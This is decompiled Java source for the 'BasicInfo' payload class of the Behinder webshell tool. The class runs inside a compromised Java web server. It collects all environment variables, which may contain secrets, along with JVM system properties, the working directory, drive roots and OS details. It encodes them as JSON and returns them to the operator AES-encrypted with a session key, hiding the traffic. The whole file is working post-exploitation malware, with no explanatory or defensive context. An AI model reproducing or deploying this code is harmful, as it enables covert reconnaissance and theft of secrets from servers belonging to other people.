 package net.rebeyond.behinder.payload.java;
 
 import java.io.File;
 import java.lang.reflect.Method;
 import java.util.Map;
 import java.util.Map.Entry;
 import java.util.Properties;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import javax.servlet.ServletOutputStream;
 import javax.servlet.ServletResponse;
 import javax.servlet.jsp.PageContext;
 
 public class BasicInfo
 {
   public boolean equals(Object obj)
   {
     PageContext page = (PageContext)obj;
     page.getResponse().setCharacterEncoding("UTF-8");
     String result = "";
     try {
       StringBuilder basicInfo = new StringBuilder("<br/><font size=2 color=red>环境变量:</font><br/>");
       Map<String, String> env = System.getenv();
       for (String name : env.keySet()) {
         basicInfo.append(name + "=" + (String)env.get(name) + "<br/>");
       }
       basicInfo.append("<br/><font size=2 color=red>JRE系统属性:</font><br/>");
       Properties props = System.getProperties();
       Object entrySet = props.entrySet();
       for (Map.Entry<Object, Object> entry : (java.util.Set)entrySet) {
         basicInfo.append(entry.getKey() + " = " + entry.getValue() + "<br/>");
       }
       String currentPath = new File("").getAbsolutePath();
       String driveList = "";
       File[] roots = File.listRoots();
       File[] arrayOfFile1; int j = (arrayOfFile1 = roots).length; for (int i = 0; i < j; i++) { File f = arrayOfFile1[i];
         driveList = driveList + f.getPath() + ";";
       }
       String osInfo = System.getProperty("os.name") + System.getProperty("os.version") + System.getProperty("os.arch");
       Object entity = new java.util.HashMap();
       ((Map)entity).put("basicInfo", basicInfo.toString());
       ((Map)entity).put("currentPath", currentPath);
       ((Map)entity).put("driveList", driveList);
       ((Map)entity).put("osInfo", osInfo);
       result = buildJson((Map)entity, true);
       
 
 
 
       String key = page.getSession().getAttribute("u").toString();
       ServletOutputStream so = page.getResponse().getOutputStream();
       so.write(Encrypt(result.getBytes(), key));
       so.flush();
       so.close();
       page.getOut().clear();
     }
     catch (Exception e) {
       e.printStackTrace();
     }
     return true;
   }
   
   public static byte[] Encrypt(byte[] bs, String key) throws Exception {
     byte[] raw = key.getBytes("utf-8");
     SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
     Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
     cipher.init(1, skeySpec);
     byte[] encrypted = cipher.doFinal(bs);
     return encrypted;
   }
   
   private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
     StringBuilder sb = new StringBuilder();
     String version = System.getProperty("java.version");
     sb.append("{");
     for (String key : entity.keySet())
     {
       sb.append("\"" + key + "\":\"");
       String value = ((String)entity.get(key)).toString();
       if (encode)
       {
         if (version.compareTo("1.9") >= 0)
         {
           getClass();Class Base64 = Class.forName("java.util.Base64");
           Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
           value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { value.getBytes("UTF-8") });
         }
         else
         {
           getClass();Class Base64 = Class.forName("sun.misc.BASE64Encoder");
           Object Encoder = Base64.newInstance();
           value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { value.getBytes("UTF-8") });
           value = value.replace("\n", "").replace("\r", "");
         }
       }
       
 
       sb.append(value);
       sb.append("\",");
     }
     sb.setLength(sb.length() - 1);
     sb.append("}");
     return sb.toString();
   }
 }


/* Location:              /Users/0x101/safe/mytools_10012106/afterLoader/Behinder.jar!/net/rebeyond/behinder/payload/java/BasicInfo.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */